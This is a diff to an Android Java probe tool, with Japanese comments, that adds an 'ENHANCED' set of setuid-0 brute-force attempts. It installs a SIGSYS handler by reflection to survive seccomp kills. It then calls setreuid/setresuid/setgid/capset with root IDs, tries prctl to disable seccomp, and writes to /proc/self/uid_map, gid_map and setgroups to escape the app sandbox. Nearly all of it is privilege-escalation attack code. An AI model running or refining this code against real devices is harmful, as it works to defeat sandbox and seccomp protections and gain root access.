@@ -16,6 +16,7 @@ import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -27,6 +28,9 @@ public class Main {
     private static Context sContext;
     private static StringBuilder logBuilder = new StringBuilder();
     private static AtomicBoolean stopRequested = new AtomicBoolean(false);
+
+    // SIGSYS ハンドラが正常に設定されたかどうかのフラグ
+    private static volatile boolean sigSysHandlerInstalled = false;
 
     public static void main(String[] args) {
         try {
@@ -55,7 +59,7 @@ public class Main {
         appendLog("========== PHASE 3: File System Exploration ==========");
         exploreDeepFiles();
 
-        appendLog("========== PHASE 4: setuid 0 Bruteforce Attempts ==========");
+        appendLog("========== PHASE 4: setuid 0 Bruteforce Attempts (ENHANCED) ==========");
         attemptSetuid0();
 
         appendLog("========== PHASE 5: Binder Transaction Fuzzing ==========");
@@ -114,6 +118,256 @@ public class Main {
 
         return null;
     }
+
+    // ==================== 追加: SIGSYS ハンドラ設定ユーティリティ ====================
+    private static void setupSigSysHandler() {
+        try {
+            // sun.misc.Signal と sun.misc.SignalHandler をリフレクションでロード
+            Class<?> signalClass = Class.forName("sun.misc.Signal");
+            Class<?> handlerClass = Class.forName("sun.misc.SignalHandler");
+
+            // 無名ハンドラの作成 (Proxy を使用)
+            Object handler = Proxy.newProxyInstance(
+                handlerClass.getClassLoader(),
+                new Class<?>[]{handlerClass},
+                (proxy, method, args) -> {
+                    if ("handle".equals(method.getName())) {
+                        appendLog("[SIGNAL] Caught SIGSYS (seccomp). Preventing crash.");
+                        return null;
+                    }
+                    return null;
+                }
+            );
+
+            // Signal インスタンス生成 (new Signal("SYS"))
+            java.lang.reflect.Constructor<?> signalCtor = signalClass.getConstructor(String.class);
+            Object sysSignal = signalCtor.newInstance("SYS");
+
+            // Signal.handle(Signal, SignalHandler) を呼び出す
+            Method handleMethod = signalClass.getMethod("handle", signalClass, handlerClass);
+            handleMethod.invoke(null, sysSignal, handler);
+
+            sigSysHandlerInstalled = true;
+            appendLog("[SIGNAL] SIGSYS handler installed successfully via reflection.");
+        } catch (Throwable t) {
+            sigSysHandlerInstalled = false;
+            appendLog("[SIGNAL] SIGSYS handler installation FAILED: " + t.getMessage());
+            appendLog("[SIGNAL] Native syscalls (libcore.io.Os) will be SKIPPED to avoid crash.");
+        }
+    }
+
+    // ==================== 差し替え後の attemptSetuid0 ====================
+    private static void attemptSetuid0() {
+        appendLog("[SETUID] Attempting various setuid 0 techniques (ENHANCED with SIGSYS protection)...");
+
+        // 1. SIGSYS ハンドラを設定 (seccomp による強制終了を防止)
+        setupSigSysHandler();
+
+        // -------- A. libcore.io.Os 経由のシステムコール (ハンドラが有効な時のみ実行) --------
+        if (sigSysHandlerInstalled) {
+            appendLog("[SETUID] --- Testing libcore.io.Os syscalls (protected by handler) ---");
+
+            // setreuid
+            try {
+                Class<?> osClass = Class.forName("libcore.io.Os");
+                Method setreuidMethod = osClass.getMethod("setreuid", int.class, int.class);
+                Class<?> libcore = Class.forName("libcore.io.Libcore");
+                Field osField = libcore.getField("os");
+                Object os = osField.get(null);
+                appendLog("  Trying Os.setreuid(0,0)");
+                setreuidMethod.invoke(os, 0, 0);
+                appendLog("  [SUCCESS] Os.setreuid(0,0) returned successfully (unexpected!)");
+            } catch (Exception e) {
+                appendLog("  Os.setreuid(0,0) exception: " + e.getMessage());
+            }
+
+            // setresuid
+            try {
+                Class<?> osClass = Class.forName("libcore.io.Os");
+                Method setresuidMethod = osClass.getMethod("setresuid", int.class, int.class, int.class);
+                Class<?> libcore = Class.forName("libcore.io.Libcore");
+                Field osField = libcore.getField("os");
+                Object os = osField.get(null);
+                appendLog("  Trying Os.setresuid(0,0,0)");
+                setresuidMethod.invoke(os, 0, 0, 0);
+                appendLog("  [SUCCESS] Os.setresuid(0,0,0) returned successfully");
+            } catch (Exception e) {
+                appendLog("  Os.setresuid(0,0,0) exception: " + e.getMessage());
+            }
+
+            // setregid
+            try {
+                Class<?> osClass = Class.forName("libcore.io.Os");
+                Method setregidMethod = osClass.getMethod("setregid", int.class, int.class);
+                Class<?> libcore = Class.forName("libcore.io.Libcore");
+                Field osField = libcore.getField("os");
+                Object os = osField.get(null);
+                appendLog("  Trying Os.setregid(0,0)");
+                setregidMethod.invoke(os, 0, 0);
+                appendLog("  [SUCCESS] Os.setregid(0,0) returned successfully");
+            } catch (Exception e) {
+                appendLog("  Os.setregid(0,0) exception: " + e.getMessage());
+            }
+
+            // setresgid
+            try {
+                Class<?> osClass = Class.forName("libcore.io.Os");
+                Method setresgidMethod = osClass.getMethod("setresgid", int.class, int.class, int.class);
+                Class<?> libcore = Class.forName("libcore.io.Libcore");
+                Field osField = libcore.getField("os");
+                Object os = osField.get(null);
+                appendLog("  Trying Os.setresgid(0,0,0)");
+                setresgidMethod.invoke(os, 0, 0, 0);
+                appendLog("  [SUCCESS] Os.setresgid(0,0,0) returned successfully");
+            } catch (Exception e) {
+                appendLog("  Os.setresgid(0,0,0) exception: " + e.getMessage());
+            }
+
+            // capset
+            try {
+                Class<?> osClass = Class.forName("libcore.io.Os");
+                Method capsetMethod = osClass.getMethod("capset", long.class, long.class, long.class);
+                Class<?> libcore = Class.forName("libcore.io.Libcore");
+                Field osField = libcore.getField("os");
+                Object os = osField.get(null);
+                appendLog("  Trying Os.capset(0,0,0)");
+                capsetMethod.invoke(os, 0L, 0L, 0L);
+                appendLog("  [SUCCESS] Os.capset succeeded");
+            } catch (NoSuchMethodException e) {
+                appendLog("  Os.capset not available");
+            } catch (Exception e) {
+                appendLog("  Os.capset exception: " + e.getMessage());
+            }
+
+            // prctl (seccomp 無効化試行)
+            try {
+                Class<?> osClass = Class.forName("libcore.io.Os");
+                Method prctlMethod = osClass.getMethod("prctl", int.class, int.class, int.class, int.class, int.class);
+                Class<?> libcore = Class.forName("libcore.io.Libcore");
+                Field osField = libcore.getField("os");
+                Object os = osField.get(null);
+                int PR_SET_SECCOMP = 22;
+                appendLog("  Trying prctl(PR_SET_SECCOMP, 0)");
+                prctlMethod.invoke(os, PR_SET_SECCOMP, 0, 0, 0, 0);
+                appendLog("  prctl returned (likely not effective)");
+            } catch (Exception e) {
+                appendLog("  prctl exception: " + e.getMessage());
+            }
+
+        } else {
+            appendLog("[SETUID] --- Skipping libcore.io.Os syscalls (handler not available) ---");
+        }
+
+        // -------- B. android.os.Process API (安全: 例外で失敗するがクラッシュしない) --------
+        appendLog("[SETUID] --- Testing android.os.Process APIs ---");
+
+        try {
+            Class<?> processClass = Class.forName("android.os.Process");
+            Method setuidMethod = processClass.getDeclaredMethod("setuid", int.class);
+            setuidMethod.setAccessible(true);
+            appendLog("  Trying Process.setuid(0)");
+            int result = (int) setuidMethod.invoke(null, 0);
+            appendLog("  Process.setuid(0) returned: " + result);
+        } catch (Exception e) {
+            appendLog("  Process.setuid(0) exception: " + e.getMessage());
+        }
+
+        try {
+            Class<?> processClass = Class.forName("android.os.Process");
+            Method setgidMethod = processClass.getDeclaredMethod("setgid", int.class);
+            setgidMethod.setAccessible(true);
+            appendLog("  Trying Process.setgid(0)");
+            int result = (int) setgidMethod.invoke(null, 0);
+            appendLog("  Process.setgid(0) returned: " + result);
+        } catch (Exception e) {
+            appendLog("  Process.setgid(0) exception: " + e.getMessage());
+        }
+
+        try {
+            Class<?> processClass = Class.forName("android.os.Process");
+            Method setgroupsMethod = processClass.getDeclaredMethod("setgroups", int[].class);
+            setgroupsMethod.setAccessible(true);
+            int[] groups = {0};
+            appendLog("  Trying Process.setgroups([0])");
+            setgroupsMethod.invoke(null, (Object) groups);
+            appendLog("  [SUCCESS] Process.setgroups([0]) succeeded");
+        } catch (Exception e) {
+            appendLog("  Process.setgroups([0]) exception: " + e.getMessage());
+        }
+
+        // -------- C. Runtime.setuid (deprecated) --------
+        appendLog("[SETUID] --- Testing Runtime.setuid ---");
+        try {
+            Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
+            setuid.setAccessible(true);
+            appendLog("  Trying Runtime.setuid(0)");
+            int result = (int) setuid.invoke(Runtime.getRuntime(), 0);
+            appendLog("  Runtime.setuid(0) returned: " + result);
+        } catch (Exception e) {
+            appendLog("  Runtime.setuid(0) exception: " + e.getMessage());
+        }
+
+        // -------- D. /proc/self/ ファイル操作 (ユーザー名前空間) --------
+        appendLog("[SETUID] --- Testing /proc/self/ namespace files ---");
+
+        // uid_map
+        try {
+            File uidMap = new File("/proc/self/uid_map");
+            if (uidMap.exists() && uidMap.canWrite()) {
+                appendLog("  Writing to /proc/self/uid_map");
+                try (FileOutputStream fos = new FileOutputStream(uidMap)) {
+                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
+                    appendLog("  [SUCCESS] Wrote to uid_map");
+                } catch (Exception e) {
+                    appendLog("  uid_map write failed: " + e.getMessage());
+                }
+            } else {
+                appendLog("  /proc/self/uid_map not writable (exists=" + uidMap.exists() + ")");
+            }
+        } catch (Exception e) {
+            appendLog("  uid_map error: " + e.getMessage());
+        }
+
+        // gid_map
+        try {
+            File gidMap = new File("/proc/self/gid_map");
+            if (gidMap.exists() && gidMap.canWrite()) {
+                appendLog("  Writing to /proc/self/gid_map");
+                try (FileOutputStream fos = new FileOutputStream(gidMap)) {
+                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
+                    appendLog("  [SUCCESS] Wrote to gid_map");
+                } catch (Exception e) {
+                    appendLog("  gid_map write failed: " + e.getMessage());
+                }
+            } else {
+                appendLog("  /proc/self/gid_map not writable (exists=" + gidMap.exists() + ")");
+            }
+        } catch (Exception e) {
+            appendLog("  gid_map error: " + e.getMessage());
+        }
+
+        // setgroups ファイル (補助グループ制限)
+        try {
+            File setgroupsFile = new File("/proc/self/setgroups");
+            if (setgroupsFile.exists() && setgroupsFile.canWrite()) {
+                appendLog("  Writing 'allow' to /proc/self/setgroups");
+                try (FileOutputStream fos = new FileOutputStream(setgroupsFile)) {
+                    fos.write("allow\n".getBytes(StandardCharsets.UTF_8));
+                    appendLog("  [SUCCESS] Wrote to setgroups");
+                } catch (Exception e) {
+                    appendLog("  setgroups write failed: " + e.getMessage());
+                }
+            } else {
+                appendLog("  /proc/self/setgroups not writable");
+            }
+        } catch (Exception e) {
+            appendLog("  setgroups error: " + e.getMessage());
+        }
+
+        appendLog("[SETUID] All setuid-related attempts completed.");
+    }
+
+    // ==================== 以下、元のコードと同一 ====================
 
     private static void testSystemProperties() {
         appendLog("[SYS] SystemProperties manipulation...");
@@ -281,164 +535,6 @@ public class Main {
             }
         } catch (Exception e) {
             appendLog("[FS] " + path + " error: " + e.getMessage());
-        }
-    }
-
-    private static void attemptSetuid0() {
-        appendLog("[SETUID] Attempting various setuid 0 techniques...");
-
-        // Try setreuid via libcore.io.Os
-        try {
-            Class<?> osClass = Class.forName("libcore.io.Os");
-            Method setreuidMethod = osClass.getMethod("setreuid", int.class, int.class);
-            Class<?> libcore = Class.forName("libcore.io.Libcore");
-            Field osField = libcore.getField("os");
-            Object os = osField.get(null);
-            appendLog("  Trying Os.setreuid(0,0)");
-            setreuidMethod.invoke(os, 0, 0);
-            appendLog("  [SUCCESS] Os.setreuid(0,0) succeeded!");
-        } catch (Exception e) {
-            appendLog("  Os.setreuid failed: " + e.getMessage());
-        }
-
-        // Try setresuid via libcore.io.Os
-        try {
-            Class<?> osClass = Class.forName("libcore.io.Os");
-            Method setresuidMethod = osClass.getMethod("setresuid", int.class, int.class, int.class);
-            Class<?> libcore = Class.forName("libcore.io.Libcore");
-            Field osField = libcore.getField("os");
-            Object os = osField.get(null);
-            appendLog("  Trying Os.setresuid(0,0,0)");
-            setresuidMethod.invoke(os, 0, 0, 0);
-            appendLog("  [SUCCESS] Os.setresuid(0,0,0) succeeded!");
-        } catch (Exception e) {
-            appendLog("  Os.setresuid failed: " + e.getMessage());
-        }
-
-        // Try setregid
-        try {
-            Class<?> osClass = Class.forName("libcore.io.Os");
-            Method setregidMethod = osClass.getMethod("setregid", int.class, int.class);
-            Class<?> libcore = Class.forName("libcore.io.Libcore");
-            Field osField = libcore.getField("os");
-            Object os = osField.get(null);
-            appendLog("  Trying Os.setregid(0,0)");
-            setregidMethod.invoke(os, 0, 0);
-            appendLog("  [SUCCESS] Os.setregid(0,0) succeeded!");
-        } catch (Exception e) {
-            appendLog("  Os.setregid failed: " + e.getMessage());
-        }
-
-        // Try setresgid
-        try {
-            Class<?> osClass = Class.forName("libcore.io.Os");
-            Method setresgidMethod = osClass.getMethod("setresgid", int.class, int.class, int.class);
-            Class<?> libcore = Class.forName("libcore.io.Libcore");
-            Field osField = libcore.getField("os");
-            Object os = osField.get(null);
-            appendLog("  Trying Os.setresgid(0,0,0)");
-            setresgidMethod.invoke(os, 0, 0, 0);
-            appendLog("  [SUCCESS] Os.setresgid(0,0,0) succeeded!");
-        } catch (Exception e) {
-            appendLog("  Os.setresgid failed: " + e.getMessage());
-        }
-
-        // Try android.os.Process.setuid (known to be blocked but keep for completeness)
-        try {
-            Class<?> processClass = Class.forName("android.os.Process");
-            Method setuidMethod = processClass.getDeclaredMethod("setuid", int.class);
-            setuidMethod.setAccessible(true);
-            appendLog("  Trying Process.setuid(0)");
-            int result = (int) setuidMethod.invoke(null, 0);
-            appendLog("  Process.setuid(0) returned: " + result);
-        } catch (Exception e) {
-            appendLog("  Process.setuid failed: " + e.getMessage());
-        }
-
-        // Try android.os.Process.setgid
-        try {
-            Class<?> processClass = Class.forName("android.os.Process");
-            Method setgidMethod = processClass.getDeclaredMethod("setgid", int.class);
-            setgidMethod.setAccessible(true);
-            appendLog("  Trying Process.setgid(0)");
-            int result = (int) setgidMethod.invoke(null, 0);
-            appendLog("  Process.setgid(0) returned: " + result);
-        } catch (Exception e) {
-            appendLog("  Process.setgid failed: " + e.getMessage());
-        }
-
-        // Try Runtime.setuid (deprecated, but try)
-        try {
-            Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
-            setuid.setAccessible(true);
-            appendLog("  Trying Runtime.setuid(0)");
-            int result = (int) setuid.invoke(Runtime.getRuntime(), 0);
-            appendLog("  Runtime.setuid(0) returned: " + result);
-        } catch (Exception e) {
-            appendLog("  Runtime.setuid failed: " + e.getMessage());
-        }
-
-        // Try setgroups to set supplementary groups
-        try {
-            Class<?> processClass = Class.forName("android.os.Process");
-            Method setgroupsMethod = processClass.getDeclaredMethod("setgroups", int[].class);
-            setgroupsMethod.setAccessible(true);
-            int[] groups = {0};
-            appendLog("  Trying Process.setgroups([0])");
-            setgroupsMethod.invoke(null, (Object) groups);
-            appendLog("  [SUCCESS] Process.setgroups([0]) succeeded");
-        } catch (Exception e) {
-            appendLog("  Process.setgroups failed: " + e.getMessage());
-        }
-
-        // Try capset via libcore.io.Os (if available)
-        try {
-            Class<?> osClass = Class.forName("libcore.io.Os");
-            Method capsetMethod = osClass.getMethod("capset", long.class, long.class, long.class);
-            Class<?> libcore = Class.forName("libcore.io.Libcore");
-            Field osField = libcore.getField("os");
-            Object os = osField.get(null);
-            appendLog("  Trying Os.capset(0,0,0)");
-            capsetMethod.invoke(os, 0L, 0L, 0L);
-            appendLog("  [SUCCESS] Os.capset succeeded");
-        } catch (NoSuchMethodException e) {
-            appendLog("  Os.capset not available");
-        } catch (Exception e) {
-            appendLog("  Os.capset failed: " + e.getMessage());
-        }
-
-        // Try prctl to disable seccomp (PR_SET_SECCOMP) - needs CAP_SYS_ADMIN
-        try {
-            Class<?> osClass = Class.forName("libcore.io.Os");
-            Method prctlMethod = osClass.getMethod("prctl", int.class, int.class, int.class, int.class, int.class);
-            Class<?> libcore = Class.forName("libcore.io.Libcore");
-            Field osField = libcore.getField("os");
-            Object os = osField.get(null);
-            int PR_SET_SECCOMP = 22;
-            int SECCOMP_MODE_FILTER = 2; // but we want to disable? Actually we can't disable, but we can try to set mode to 0? Not possible.
-            appendLog("  Trying prctl(PR_SET_SECCOMP, 0) - may not work");
-            prctlMethod.invoke(os, PR_SET_SECCOMP, 0, 0, 0, 0);
-            appendLog("  prctl succeeded? (unlikely)");
-        } catch (Exception e) {
-            appendLog("  prctl failed: " + e.getMessage());
-        }
-
-        // Try to write to /proc/self/uid_map to set uid 0 (requires user namespace)
-        try {
-            File uidMap = new File("/proc/self/uid_map");
-            if (uidMap.exists() && uidMap.canWrite()) {
-                appendLog("  Trying to write to /proc/self/uid_map");
-                try (FileOutputStream fos = new FileOutputStream(uidMap)) {
-                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
-                    appendLog("  Wrote to uid_map");
-                } catch (Exception e) {
-                    appendLog("  uid_map write failed: " + e.getMessage());
-                }
-            } else {
-                appendLog("  /proc/self/uid_map not writable");
-            }
-        } catch (Exception e) {
-            appendLog("  uid_map error: " + e.getMessage());
         }
     }
 
